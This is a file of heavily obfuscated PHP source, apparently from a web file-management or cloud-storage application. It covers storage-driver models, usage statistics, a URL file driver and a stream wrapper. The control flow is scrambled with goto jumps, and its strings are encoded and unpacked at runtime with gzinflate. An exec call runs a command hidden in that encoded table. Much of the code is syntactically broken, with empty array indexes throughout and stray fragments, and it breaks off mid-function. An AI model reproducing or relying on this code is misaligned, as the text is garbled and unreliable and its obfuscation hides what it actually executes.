public function trend($fɈے, $a亨) { goto cݭ; Dɮ: return $E; goto c㹋폼; cݭ: $bΆ =& $_SERVER[]; if (!$this->init($fɈے)) { return !1; } $E鬆 = $this->trendList($fɈے); goto bӘ; bӘ: if ($E鬆 && $a亨 != $bΆ[1519]) { $a菊 = $E鬆[0][$bΆ[222]]; $c䆳 = $this->validDate($a亨, $a菊); $aψ = array(); $DЅ = array_to_keyvalue($E鬆, $bΆ[222]); foreach ($c䆳 as $B̔) { if (isset($DЅ[$B̔])) { $bǣ͆ = $DЅ[$B̔]; } else { $bǣ͆ = end($E鬆); $bǣ͆[$bΆ[222]] = $B̔; if ($fɈے == $bΆ[588]) { $bǣ͆[$bΆ[1642]] = $bǣ͆[$bΆ[1643]] = 0; } } $aψ[] = $bǣ͆; } $E鬆 = $aψ; } $AА = array($bΆ[588] => array($bΆ[742] => LNG($bΆ[1658]), $bΆ[1642] => LNG($bΆ[1659]), $bΆ[1643] => LNG($bΆ[1660])), $bΆ[1644] => array($bΆ[740] => LNG($bΆ[1661]), $bΆ[1646] => LNG($bΆ[1662]), $bΆ[1647] => LNG($bΆ[1663]), $bΆ[1648] => LNG($bΆ[1664]))); $eұ = array($bΆ[588] => $bΆ[1665], $bΆ[1644] => $bΆ[78]); goto e; e: if (empty($E鬆)) { $B̔ = date($bΆ[1649], strtotime($bΆ[1650])); $aȰ = array($bΆ[222] => $B̔); foreach ($AА[$fɈے] as $Fٖ => $bۧꓕ) { $aȰ[$Fٖ] = 0; } $E鬆[] = $aȰ; } $E = array(); foreach ($E鬆 as $bۧꓕ) { if ($fɈے == $bΆ[1644] && $bۧꓕ[$bΆ[1646]] > $bۧꓕ[$bΆ[740]]) { $bۧꓕ[$bΆ[1646]] = $bۧꓕ[$bΆ[740]]; } foreach ($AА[$fɈے] as $Fٖ => $fƌ) { $bǣ͆ = array($bΆ[222] => $bۧꓕ[$bΆ[222]], $bΆ[1449] => $fƌ); $bǣ͆[$eұ[$fɈے]] = isset($bۧꓕ[$Fٖ]) ? $bۧꓕ[$Fٖ] : 0; $E[] = $bǣ͆; } } goto Dɮ; c㹋폼: } public function validDate($eڎ, $A) { goto f㹻; CĹ: return $A֍Ր; goto aփ; f㹻: $D׊ =& $_SERVER[]; $cࠇ = date($D׊[1649], strtotime($D׊[1650])); $A֍Ր = array($cࠇ); goto C; C: switch ($eڎ) { case $D׊[1526]: $e = mktime(0, 0, 0, date($D׊[1666]), date($D׊[1270]) - date($D׊[1331]) + 7 - 7, date($D׊[1667])); $Dב = 0; do { $E× = date($D׊[1649], $e - 3600 * 24 * 7 * $Dב); $A֍Ր[] = $E×; $Dב++; } while ($A < $E×); break; case $D׊[1524]: $Dב = 1; do { $A̧ = date($D׊[1668], strtotime("\x2d\40{$Dב}\x20\x6d\157\156\x74\150\163")); $A֍Ր[] = $A̧; $Dב++; } while ($A < $A̧); break; case $D׊[1669]: $dŻ = (int) date($D׊[1667], strtotime($A)); $bМ = (int) date($D׊[1667]); if ($dŻ >= $bМ) { break; } for ($dŻ; $dŻ < $bМ; $dŻ++) { $A֍Ր[] = $dŻ . $D׊[1670]; } break; default: break; } if ($A > end($A֍Ր)) { array_pop($A֍Ր); } sort($A֍Ր); goto CĹ; aփ: } public function listTable($F) { $B = ucfirst($F); return Model($B)->listData(); } public function option($FӉ) { $E = $_SERVER[][1671] . ucfirst($FӉ); return $this->{$E}(); } private function optionUser() { goto C; C: $F̌ =& $_SERVER[]; $cȕ = Model($F̌[532])->count($F̌[1546]); $AÈ = Model($F̌[532])->where($F̌[1672])->count($F̌[1546]); goto cɧ; E: if ($Bʽ < $B) { $Bʽ = $B; } $dۊ = array($F̌[1673] => array($F̌[990], $Bʽ)); $E㣦ٶ = (int) Model($F̌[532])->where($dۊ)->count($F̌[1546]); goto DϹ҈; C: return array($F̌[736] => (int) $cȕ, $F̌[1674] => (int) ($cȕ - $AÈ), $F̌[1675] => (int) $AÈ, $F̌[1676] => (int) $EÏ, $F̌[1677] => $E㣦ٶ); goto c脼; cɧ: $D = intval($GLOBALS[$F̌[6]][$F̌[347]][$F̌[1505]]) / 3600; $Bʽ = strtotime("\x2d{$D}\x20\x68\157\165\x72\163"); $B = strtotime(date($F̌[1653])); goto E; DϹ҈: if (!$E㣦ٶ) { $E㣦ٶ = 1; } $dۊ = array($F̌[1673] => array($F̌[990], $B)); $EÏ = Model($F̌[532])->where($dۊ)->count($F̌[1546]); goto C; c脼: } private function optionFile() { goto cʜ; cʜ: $Bǅ =& $_SERVER[]; $Dưɐ = $this->sourceSize(); $dߵ = $Dưɐ[$Bǅ[78]]; goto f; f: $E֢펫 = $Dưɐ[$Bǅ[1646]]; $c肿 = Model($Bǅ[809])->where(array($Bǅ[405] => 0))->count($Bǅ[397]); $C겂 = array($Bǅ[405] => 0, $Bǅ[194] => array($Bǅ[990], strtotime(date($Bǅ[1653])))); goto cǻ; cǻ: $F׶ = Model($Bǅ[809])->where($C겂)->sum($Bǅ[78]); $eڰ = Model($Bǅ[809])->where($C겂)->count($Bǅ[397]); return array($Bǅ[740] => $dߵ, $Bǅ[1646] => $E֢펫, $Bǅ[1678] => $dߵ - $E֢펫, $Bǅ[1679] => (int) $F׶, $Bǅ[742] => (int) $c肿, $Bǅ[1680] => (int) $eڰ); goto DΝܗ; DΝܗ: } private function optionAccess() { $D鐏 =& $_SERVER[]; return array($D鐏[736] => $this->typeLogCnt(), $D鐏[107] => $this->typeLogCnt($D鐏[107]), $D鐏[444] => $this->typeLogCnt($D鐏[444]), $D鐏[1681] => $this->typeLogCnt($D鐏[1681]), $D鐏[1682] => $this->typeLogCnt($D鐏[1682]), $D鐏[588] => $this->typeLogCnt($D鐏[33], $D鐏[1657])); } private function typeLogCnt($D = '', $D˶ = "\151\144") { goto eƻۻ; eƻۻ: $B =& $_SERVER[]; $a = array($B[107] => array($B[1683], $B[1684]), $B[444] => array($B[1685], $B[1686]), $B[1681] => array($B[1687], $B[1688], $B[1689]), $B[1682] => array($B[1690], $B[1691]), $B[1692] => array($B[1693], $B[1694], $B[1695])); $b׊ڃ = strtotime(date($B[1653])); goto Cõڮܭ; d絇: return (int) $f̊; goto A; Cõڮܭ: $Aבᅎ = array($B[194] => array($B[990], $b׊ڃ)); if ($D) { $Aבᅎ[$B[29]] = array($B[7], $a[$D]); } $f̊ = Model($B[1656])->where($Aבᅎ)->count($D˶); goto d絇; A: } private function optionServer() { goto DŦ; fǆ: $BՈ͚ = $f׸ۑ[0]; $dͲ = $GLOBALS[$b[6]][$b[17]]; $a؈ = $dͲ[$b[951]]; goto a̧; D譑: return array($b[1698] => $Cʠ ? $Cʠ[$b[1699]] : 0, $b[1700] => $Cʠ ? $Cʠ[$b[1701]] : 0, $b[1702] => (int) $D[$b[1699]] * 1024 * 1024 * 1024, $b[1703] => (int) $aϵǑ, $b[1704] => ucfirst($BՈ͚), $b[1705] => $b[1706] . PHP_VERSION, $b[1707] => phpBuild64() ? 64 : 32, $b[735] => str_replace($b[1708], $b[967], $a؈), $b[347] => ucfirst($cмˈ), $b[28] => $_SERVER[$b[1709]]); goto cȹ; b߃: $Fζ = array($b[801] => $D[$b[395]]); $aϵǑ = Model($b[464])->where($Fζ)->sum($b[78]); $f׸ۑ = explode($b[50], $_SERVER[$b[142]]); goto fǆ; a̧: if ($a؈ == $b[774]) { $dݭ = explode($b[1184], $dͲ[$b[950]]); $a؈ = $dݭ[0]; } if ($a؈ == $b[777] || $a؈ == $b[778]) { $b© = Model()->db()->query($b[1696]); $B⿗ = $b©[0] && isset($b©[0][$b[1448]]) ? $b©[0][$b[1448]] : 0; $a؈ = $b[1697] . ($B⿗ ? $b[8] . $B⿗ : $b[33]); } $cмˈ = $GLOBALS[$b[6]][$b[347]][$b[811]]; goto D譑; DŦ: $b =& $_SERVER[]; $Cʠ = $this->diskDriver(); $D = KodIO::defaultDriver(); goto b߃; cȹ: } private function diskDriver() { goto D܇; dԡ: $eϺ = $A⨂ - @disk_free_space($B); return array($Dʇ[1699] => $A⨂, $Dʇ[1701] => $eϺ); goto E; Fͯ: if ($fΝ) { $B = $Dʇ[1712]; if (function_exists($Dʇ[1713])) { exec($Dʇ[1714], $Dᚶ); $B = $Dᚶ[1] . $Dʇ[8]; } } if (!file_exists($B)) { return; } $A⨂ = @disk_total_space($B); goto dԡ; D܇: $Dʇ =& $_SERVER[]; $B = $Dʇ[8]; $fΝ = $GLOBALS[$Dʇ[6]][$Dʇ[1710]] == $Dʇ[1711]; goto Fͯ; E: } public function fileChart($eʹ) { goto CԦ; CԦ: $Dԣ =& $_SERVER[]; if (isset($eʹ[$Dԣ[1546]])) { return Model($Dԣ[809])->userFileTypeProfile($eʹ[$Dԣ[1546]]); } if (isset($eʹ[$Dԣ[1715]])) { return Model($Dԣ[809])->groupFileTypeProfile($eʹ[$Dԣ[1715]]); } goto Dҥ; aҮ: $fڈ[$Dԣ[406]] = 2; $E = Model($Dԣ[809])->where($fڈ)->sum($Dԣ[78]); return array($Dԣ[740] => $B[$Dԣ[78]], $Dԣ[1646] => $B[$Dԣ[1646]], $Dԣ[1647] => (int) $a, $Dԣ[1648] => (int) $E); goto b؆ӟ҃; Dҥ: $B = $this->sourceSize(); $fڈ = array($Dԣ[492] => 0, $Dԣ[406] => 1); $a = Model($Dԣ[809])->where($fڈ)->sum($Dԣ[78]); goto aҮ; b؆ӟ҃: } private function sourceSize() { $D䈂 =& $_SERVER[]; $bƉ = Model($D䈂[809])->where(array($D䈂[405] => 0))->sum($D䈂[78]); $E׃Ӌ = Model($D䈂[464])->sum($D䈂[78]); if ($E׃Ӌ > $bƉ) { $E׃Ӌ = $bƉ; } return array($D䈂[78] => (int) $bƉ, $D䈂[1646] => (int) $E׃Ӌ); } } goto F刴; B: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x73\x6f\x75\x72\x63\145\123\145\x63\x72\x65\x74\114\151\x73\164"; public $field = array("\x73\x6f\165\x72\x63\145\111\104", "\x74\x79\160\145\x49\x44", "\143\162\x65\x61\164\145\x55\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\x73\164\x6f\x72\x61\x67\x65\114\151\163\x74"; public $field = array("\x6e\141\155\x65", "\x73\151\172\x65\x4d\x61\170", "\x73\171\163\164\x65\x6d", "\144\145\146\141\x75\154\x74", "\x64\162\151\x76\145\x72", "\x63\x6f\x6e\x66\151\x67"); public function listData($C = false, $Dָ = "\155\157\144\x69\x66\171\x54\x69\x6d\x65", $C = false) { $fʛ =& $_SERVER[]; $C = parent::listData($C, $Dָ, $C); if ($C) { return $C; } $A꘥ = $this->ioSizeUseGet(array_to_keyvalue($C, $fʛ[33], $fʛ[395])); foreach ($C as $D֛ => $cݜ) { unset($C[$D֛][$fʛ[6]]); $C[$D֛][$fʛ[1701]] = isset($A꘥[$cݜ[$fʛ[395]]]) ? $A꘥[$cݜ[$fʛ[395]]] : 0; } return $C; } public function ioSizeUseGet($cфĐ) { goto f殤̹; f殤̹: $Cȭ =& $_SERVER[]; if (!$cфĐ) { return array(); } $cΕ = $Cȭ[2015] . implode($Cȭ[47], $cфĐ); goto a甅; FÄ: $b = array($Cȭ[801] => array($Cȭ[7], $cфĐ)); $fӐ = Model($Cȭ[764])->field($cԆ)->where($b)->group($Cȭ[801])->select(); $fӐ = array_to_keyvalue($fӐ, $Cȭ[395], $Cȭ[78]); goto d; d: Cache::set($cΕ, $fӐ, 600); return $fӐ; goto AĆ; a甅: $fӐ = Cache::get($cΕ); if ($fӐ) { return $fӐ; } $cԆ = array($Cȭ[801] => $Cȭ[395], $Cȭ[2016] => $Cȭ[78]); goto FÄ; AĆ: } public function getConfig($B) { $E = parent::listData($B); return json_decode($E[$_SERVER[][6]], !0); } public function update($f٢, $dɖ) { goto Fݏ; D: if (isset($bכ҆[$Bފ]) && $bכ҆[$Bފ][$cض[395]] != $f٢) { return !1; } if (isset($dɖ[$cض[2017]]) && $dɖ[$cض[2017]] == $cض[87]) { $this->checkConfig($dɖ); } unset($dɖ[$cض[2017]]); goto F; Fݏ: $cض =& $_SERVER[]; $Bފ = $dɖ[$cض[28]]; $bכ҆ = array_to_keyvalue(parent::listData(), $cض[28]); goto D; F: $CĿ = parent::update($f٢, $dɖ); if ($CĿ && $dɖ[$cض[34]]) { foreach ($bכ҆ as $b) { if ($b[$cض[34]] && $b[$cض[395]] != $f٢) { parent::update($b[$cض[395]], array($cض[34] => 0)); } } } return $CĿ; goto B; B: } public function add($d㑣) { goto dȶݾ; dȶݾ: $Bץ =& $_SERVER[]; $f = array_to_keyvalue(parent::listData(), $Bץ[28]); if (isset($f[$d㑣[$Bץ[28]]])) { return !1; } goto bἝ; bἝ: $this->checkConfig($d㑣); $Bݥ = parent::insert($d㑣); if ($Bݥ && $d㑣[$Bץ[34]]) { foreach ($f as $C⟇) { if ($C⟇[$Bץ[34]]) { parent::update($C⟇[$Bץ[395]], array($Bץ[34] => 0)); } } } goto e믓β; e믓β: return $Bݥ; goto bނ햫; bނ햫: } public function checkConfig(&$Eǧ, $D = false) { goto aΑ; F臒: foreach ($f牖 as $c => $dɷꆴ) { $f牖[$c] = trim($dɷꆴ); } $f牖[$cƼ[2018]] = rand_string(6); $dݻʸ = $GLOBALS[$cƼ[6]][$cƼ[88]][$cƼ[810]]; goto F̔; F̔: $aᬷ = isset($dݻʸ[$BͽĢ]) ? $dݻʸ[$BͽĢ] : ucfirst($BͽĢ); $a = $cƼ[72] . $aᬷ; if (!$aᬷ || !class_exists($a)) { if ($D) { return LNG($cƼ[2019]); } write_log(array($cƼ[2020], $Eǧ, get_caller_info()), $cƼ[2021]); show_json(LNG($cƼ[2019]), !1, $Eǧ); } goto F֪; Bﱩȉ: $D = $e筄->getPath($F . $cƼ[1155]); if (!$e筄->mkfile($D)) { if ($D) { return LNG($cƼ[2022]); } show_json(LNG($cƼ[2022]), !1); } $f牖[$cƼ[1093]] = $F; goto Aꄧ; F֪: $e筄 = new $a($f牖); if (in_array($BͽĢ, $e筄->objectDriver)) { if (!$e筄->isBucketCors() && !$e筄->setBucketCors()) { $eՄ = LNG($cƼ[2022]); $eՄ .= $cƼ[2023] . LNG($cƼ[2024]); if ($D) { return $eՄ; } show_json($eՄ, !1); } } $F = rtrim($f牖[$cƼ[1093]], $cƼ[8]) . $cƼ[8]; goto Bﱩȉ; aΑ: $cƼ =& $_SERVER[]; $BͽĢ = strtolower($Eǧ[$cƼ[94]]); $f牖 = json_decode($Eǧ[$cƼ[6]], !0); goto F臒; Aꄧ: $Eǧ[$cƼ[6]] = json_encode($f牖); $Eǧ[$cƼ[94]] = $aᬷ; return !0; goto aՕʡ; aՕʡ: } public function driverListSystem() { $CȞ =& $_SERVER[]; $c䕘 = parent::listData(); $f = array(); foreach ($c䕘 as $B) { unset($B[$CȞ[194]], $B[$CȞ[84]]); $B[$CȞ[6]] = json_decode($B[$CȞ[6]], !0); $f[] = $B; } return $f; } public function defaultDriver() { $e쭭ň =& $_SERVER[]; $cঐ = parent::listData(); $C = array_filter_by_field($cঐ, $e쭭ň[34], 1); $C = $C[0]; if ($C) { $C[$e쭭ň[6]] = json_decode($C[$e쭭ň[6]], !0); } return $C; } public function driverInfo($BǼ) { $dك =& $_SERVER[]; $D͊ = array_to_keyvalue(parent::listData(), $dك[395]); if (!isset($D͊[$BǼ])) { return !1; } $D≉ܭ = $D͊[$BǼ]; $D≉ܭ[$dك[6]] = json_decode($D≉ܭ[$dك[6]], !0); return $D≉ܭ; } public function remove($Cѣ) { $this->removeShareItems($Cѣ); return parent::remove($Cѣ); } public function removeWithFile($E, $Aڎ) { goto E; b͎І: $Dȭ = Model($b[464])->where($C샎)->sum($b[78]); $DԘ = $Aڎ . $b[2025] . $E; $DⱤ = new TaskFileTransfer($DԘ, $b[2021], $dɄ, LNG($b[2026]) . "\50{$E}\51"); goto Bʈ; E: $b =& $_SERVER[]; $C샎 = array($b[801] => $E); $dɄ = Model($b[464])->where($C샎)->count(); goto b͎І; Dޖ: $Dץݸ = Model($b[193])->where($C샎)->field($b[2027])->select(); foreach ($Dץݸ as $f) { goto CÞ; fϤ: $AÙ = array($b[801] => $b˂, $b[76] => $b䪖); Model($b[193])->where($C샎)->save($AÙ); goto f鍢; dз: if (IO::exist($b䪖)) { $DⱤ->updateFileEnd($f[$b[28]], $f[$b[78]]); continue; } if (!IO::move($Bƨ, get_path_father($b䪖))) { $D׈ = !1; break; } $C샎 = array($b[461] => $f[$b[461]]); goto fϤ; CÞ: $Bƨ = $f[$b[76]]; $b䪖 = $CތՆ . str_replace("\173\151\157\72{$E}\175\x2f", $b[33], $Bƨ); if (!IO::exist($Bƨ)) { $C鳬[] = $f[$b[461]]; $DⱤ->updateFileEnd($f[$b[28]], $f[$b[78]]); continue; } goto dз; f鍢: } $this->removeByFileID($C鳬); goto BҎ; A濽: $CތՆ = "\173\151\x6f\72{$b˂}\x7d\x2f"; $D׈ = !0; $C鳬 = array(); goto Dޖ; BҎ: if (!$D׈) { $DⱤ->stop($DԘ); return !1; } $DⱤ->end(); if ($Aڎ == $b[1681]) { $this->remove($E); } goto B; Bʈ: $DⱤ->task[$b[740]] = (double) $Dȭ; $Ađ = KodIO::defaultDriver(); $b˂ = $Ađ[$b[395]]; goto A濽; B: } public function progress($DҘ, $e) { return Task::get($e . $_SERVER[][2025] . $DҘ); } private function removeByFileID($Bɕ = array()) { goto f末; f末: $Aֿ =& $_SERVER[]; if (empty($Bɕ)) { return; } $Dʆ = array($Aֿ[461] => array($Aֿ[7], $Bɕ)); goto C; D쌟: foreach ($d陛 as $F˿) { Model($Aֿ[411])->removeNow($F˿, !1); } goto EŦ; C: $d陛 = Model($Aֿ[1223])->where($Dʆ)->field($Aֿ[397])->select(); if (!$d陛) { return; } $d陛 = array_to_keyvalue($d陛, $Aֿ[33], $Aֿ[397]); goto D쌟; EŦ: } private function removeShareItems($C󞒾) { goto aᤉ; e: $Bҫ = Model($cЊ[1692])->where($B򭧊)->field($cЊ[482])->select(); if (empty($Bҫ)) { return; } $Dͥ˰ = array_to_keyvalue($Bҫ, $cЊ[33], $cЊ[482]); goto E; aᤉ: $cЊ =& $_SERVER[]; $c = "\173\x69\157\72{$C󞒾}\x7d\x2f"; $B򭧊 = array($cЊ[397] => 0, $cЊ[1088] => array($cЊ[381], "{$c}\x25")); goto e; E: Model($cЊ[589])->remove($Dͥ˰); goto B近; B近: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\x4c\151\x67\x68\164\x41\160\160"; public $modelType = "\x53\171\163\164\145\155\x4f\160\164\x69\157\x6e"; public $field = array("\156\141\155\x65", "\x67\x72\157\165\160", "\x64\145\x73\143", "\x63\x6f\x6e\x74\x65\156\x74"); public function listData($E匑͑ = false, $d = "\155\157\144\151\x66\x79\124\x69\155\x65", $C = true) { return parent::listData($E匑͑, $d, $C); } public function remove($e) { $e = $this->findByName($e); if (!$e) { return !1; } return parent::remove($e[$_SERVER[][395]]); } public function add($CĆ) { if ($this->findByName($CĆ[$_SERVER[][28]])) { return !1; } return parent::insert($CĆ); } public function update($Bޏ, $aǉ̑) { $bԧ =& $_SERVER[]; $A񊵷 = $this->findByName($Bޏ); $f˞훖 = $this->findByName($aǉ̑[$bԧ[28]]); if (!$A񊵷 || $f˞훖 && $f˞훖[$bԧ[395]] != $A񊵷[$bԧ[395]]) { return !1; } return parent::update($A񊵷[$bԧ[395]], $aǉ̑); } } goto D; a: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($fֹ = false) { } public function exist($E) { $Eڰ = $this->info($E); return $Eڰ[$_SERVER[][195]]; } public function isFile($Fޝ¦) { $Dʟ = $this->info($Fޝ¦); return $Dʟ[$_SERVER[][195]]; } public function isFolder($Dϝͯ) { return !1; } public function size($e쑂Ʋ) { $A = $this->info($e쑂Ʋ); return $A[$_SERVER[][78]]; } public function info($f) { return $this->infoParse($f); } public function infoAuth($dݓ) { return $this->infoParse($dݓ); } public function infoWithChildren($C䐢) { return $this->infoParse($C䐢); } public function infoFull($FБ) { return $this->infoParse($FБ); } private function infoParse($b) { $f =& $_SERVER[]; $e؉К = $this->header($b); if (!$e؉К || !$e؉К[$f[727]]) { return !1; } $e͚ = _get($e؉К, $f[335], 0); $fג = array($f[28] => $e؉К[$f[28]], $f[76] => $b, $f[29] => $f[193], $f[78] => intval($e͚), $f[168] => get_path_ext($e؉К[$f[28]]), $f[1273] => $e͚ > 0 && $e؉К[$f[1393]], $f[1274] => !1); return $fג; } private function header($A) { goto Fƪ; Fƪ: $A =& $_SERVER[]; if (isset(self::$_cacheHeader[$A])) { return self::$_cacheHeader[$A]; } $f܈ = isset($GLOBALS[$A[1394]]) ? $GLOBALS[$A[1394]] : !1; goto BǠ; Fߒ: return self::$_cacheHeader[$A]; goto Fę; BǠ: $GLOBALS[$A[1394]] = !0; self::$_cacheHeader[$A] = url_header($A); $GLOBALS[$A[1394]] = $f܈; goto Fߒ; Fę: } public function hashSimple($Cؓ, $bč = false) { goto B燂æ; B燂æ: $e񷓭 =& $_SERVER[]; $dؽۏ = $this->info($Cؓ); if (!$dؽۏ || !$dؽۏ[$e񷓭[195]]) { return !1; } goto E; cҚ: $cĮ = timeFloat(); $d񳸘 = 15; for ($A = 0; $A < $AօЗ; $A++) { if (timeFloat() - $cĮ > $d񳸘) { return !1; } $Dֻ = $this->fileSubstr($Cؓ, $eՅތ * $A, $E); if (!$Dֻ) { return !1; } $EЄ .= $Dֻ; } goto d; d: $EЄ .= $this->fileSubstr($Cؓ, $aҎ - $E, $E); return md5($EЄ) . $aҎ; goto c; E: $aҎ = $dؽۏ[$e񷓭[78]]; $E = 200; $AօЗ = 50; goto dë; dë: if ($aҎ <= $E * $AօЗ) { return md5($this->fileSubstr($Cؓ, 0, $aҎ)) . $aҎ; } $eՅތ = intval($aҎ / $AօЗ); $EЄ = $e񷓭[33]; goto cҚ; c: } public function getContent($B摓) { return $this->fileSubstr($B摓); } public function fileSubstr($c, $B݌ = 0, $e = -1) { goto bҼ; A: if ($e === -1) { $e = $D晥ʪ[$AДƺ[78]]; } if ($e == 0) { return $AДƺ[33]; } $A͙Ջ = array($AДƺ[1395] . $B݌ . $AДƺ[761] . ($B݌ + $e - 1)); goto E; E: $D = url_request($c, $AДƺ[228], !1, $A͙Ջ, !1, !1, 1); return $D[$AДƺ[1105]] ? $D[$AДƺ[1105]] : $AДƺ[33]; goto C; bҼ: $AДƺ =& $_SERVER[]; $D晥ʪ = $this->info($c); if (!$D晥ʪ || !$D晥ʪ[$AДƺ[195]] && $D晥ʪ[$AДƺ[78]] > 1024 * 1024 * 10) { return !1; } goto A; C: } public function download($D, $EΒ) { Downloader::start($D, $EΒ); return $EΒ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($C͓, $fڬ = '') { goto f忄; f忄: $this->info = $this->info($C͓); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[][76]]; goto EՏמ; EՏמ: $this->pathOpen = $C͓; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto d; d: if (!isset(self::$_chunkBuffer[$C͓])) { self::$_chunkBuffer[$C͓] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto Aڥ; Aڥ: } function stream_read($Dӎ) { $Cϑ = $this->fileSubstr($this->pose, $Dӎ); $this->pose += strlen($Cϑ); return $Cϑ; } public function stream_tell() { return $this->pose; } public function stream_seek($aﲉ, $dՒ) { $FԸ =& $_SERVER[]; if ($dՒ == SEEK_SET) { $this->pose = $aﲉ; } else { if ($dՒ == SEEK_CUR) { $this->pose += $aﲉ; } else { if ($dՒ == SEEK_END) { $this->pose = $this->info[$FԸ[78]] + intval($aﲉ); } } } if ($aﲉ < 0) { $this->pose = $this->info[$FԸ[78]] + $aﲉ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Aϻ, $e) { $Aǻ˖ =& $_SERVER[]; $F̾݉ = $this->info($Aϻ); return array($Aǻ˖[1396] => 0, $Aǻ˖[1397] => 0, $Aǻ˖[12] => 32768 + 511, $Aǻ˖[1398] => 0, $Aǻ˖[1399] => 0, $Aǻ˖[1400] => 0, $Aǻ˖[1401] => 0, $Aǻ˖[78] => $F̾݉[$Aǻ˖[78]], $Aǻ˖[1402] => $F̾݉[$Aǻ˖[1272]], $Aǻ˖[1358] => $F̾݉[$Aǻ˖[84]], $Aǻ˖[1357] => $F̾݉[$Aǻ˖[194]], $Aǻ˖[1403] => 0, $Aǻ˖[1404] => 0); } static $fileInfo = array(); public function info($f۸) { $D = $_SERVER[][1405]; if (isset(self::$fileInfo[$f۸])) { return self::$fileInfo[$f۸]; } if (substr($f۸, 0, strlen($D)) != $D) { return !1; } self::$fileInfo[$f۸] = IO::info(substr($f۸, strlen($D))); return self::$fileInfo[$f۸]; } public static function read($B, $Aߥ, $D쾧) { if (!isset(self::$_fopenCache[$B])) { $Fɹⷳ = new StreamWrapperIO(); $Fɹⷳ->stream_open($B); self::$_fopenCache[$B] = $Fɹⷳ; } $Fɹⷳ = self::$_fopenCache[$B]; return $Fɹⷳ->fileSubstr($Aߥ, $D쾧); } public static function _read($B, $B, $cت) { goto dȨ; a탗ƌ: $e҄ᶎ = 8192; fseek($f, $B, SEEK_SET); $c· = $B²[33]; goto bג; dƛ: return $c·; goto e; dȨ: $B² =& $_SERVER[]; $f = fopen($B, $B²[1276]); if (!$f) { return $B²[33]; } goto a탗ƌ; bג: $E = 0; while ($E < $cت) { $e = min($e҄ᶎ, $cت - $E); $c· .= fread($f, $e); $E += $e; } fclose($f); goto dƛ; e: } public function fileSubstr($dՑ, $e) { goto Fʖ; bқ: foreach ($d؆ as $d => $e՞) { $d = intval($d); $D = $d + strlen($e՞); if ($dՑ >= $D) { continue; } if ($dՑ >= $d && $dՑ + $e <= $D) { return substr($e՞, $dՑ - $d, $e); } break; } if (count($d؆) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($a͢ͼ[1406], $a͢ͼ[1407] . count($d؆) . "\x3b\x73\x74\141\162\164\x3d{$dՑ}\54\154\x65\156\147\x74\x68\75{$e}\73\x70\x6f\x73\145\72{$d}\x7e{$D}"); throw new Exception($a͢ͼ[1408]); } $Eɩ = intval($dՑ / $Bʪ) * $Bʪ; goto Dↄ; C޿: ksort($d؆); $c = substr($b킺, $dՑ - $Eɩ, $e); return $c; goto b; bޅ: $Bʪ = 64 * 1024; $d؆ =& self::$_chunkBuffer[$this->path]; if (!$d؆) { $d؆ = array(); } goto d䴮; d䴮: $d = 0; $D = 0; $e՞ = $a͢ͼ[33]; goto bқ; bญ: $c̝ɥ = $e; if ($dՑ < 0) { $dՑ = $B݌ + $dՑ; } if ($e === !1) { $e = $B݌ - $dՑ; } goto e쭒; Dↄ: $eܮȈ = ceil(($dՑ + $e) / $Bʪ) * $Bʪ - $Eɩ; $b킺 = IO::fileSubstr($this->path, $Eɩ, $eܮȈ); $d؆[$Eɩ . $a͢ͼ[33]] = $b킺; goto C޿; e쭒: if ($dՑ + $e > $B݌) { $e = $B݌ - $dՑ; } if ($e <= 0) { return $a͢ͼ[33]; } if ($dՑ < 0 || $dՑ >= $B݌ || $e <= 0 || $e > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\x6c\x65\x52\145\141\144\x20\145\162\162\x6f\162\x21\40\163\x74\x61\162\x74\x3d{$dՑ}\x3b\154\145\x6e\x67\x74\x68\x3d{$e}\x3b\x20\163\x69\x7a\x65\75{$B݌}\73"); } goto bޅ; Fʖ: $a͢ͼ =& $_SERVER[]; $B݌ = $this->info[$a͢ͼ[78]]; $c٥© = $dՑ; goto bญ; b: } private function log($C, $cӊڙ) { $f =& $_SERVER[]; $B􋉥 = timeFloat() - $this->timeStart; write_log(sprintf($f[1409], $C, $this->info[$f[28]], $B􋉥, $cӊڙ), $f[1095]); } } class Message { function __construct() { } public function send($A°ʣ = '', $e = array(), $bԧ = "\x74\x65\170\164") { goto e褹; e褹: $C䯇 =& $_SERVER[]; $dۨ = array($C䯇[29] => $C䯇[1410], $C䯇[732] => $A°ʣ); if (in_array($bԧ, array($C䯇[1410], $C䯇[1411]))) { $dۨ[$C䯇[29]] = $bԧ; } goto aǆ; aǆ: $e = array($C䯇[509] => isset($e[$C䯇[509]]) ? $e[$C䯇[509]] : $C䯇[33], $C䯇[588] => isset($e[$C䯇[588]]) ? $e[$C䯇[588]] : $C䯇[33]); if (empty($A°ʣ) || empty($e[$C䯇[509]]) && empty($e[$C䯇[588]])) { return !1; } $F՘ = array($C䯇[1351] => $dۨ, $C䯇[1412] => $e); goto cǜ; cǜ: Hook::trigger($C䯇[1413], $F՘); goto B; B: } } goto bш; f͵: $C֞ = $_SERVER[][600]; while (strlen($C֞) < $_SERVER[][601]) { if (!$C֞) { break; } $C֞++; } $_SERVER[ȂŊ] = explode($_SERVER[][602], gzinflate(substr($_SERVER[][603], 10, -8))); goto A; F󴭧ϳ: function binCheckBigger($E, $Bљ) { return $E > $Bљ; } $_SERVER[$_SERVER[][3]] = ("\71\62\60\60"."\67\60")+0;$_nf8R="bPqAnb65wgmE93nBvTzcPBJMf36IGp4JTqecskZzVWnnbrqxPKdD2TiQ2jyPpkXb78EVKUzNJyD29GFiKC";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($C̾, $f߈ޝ) { $c =& $_SERVER[]; if 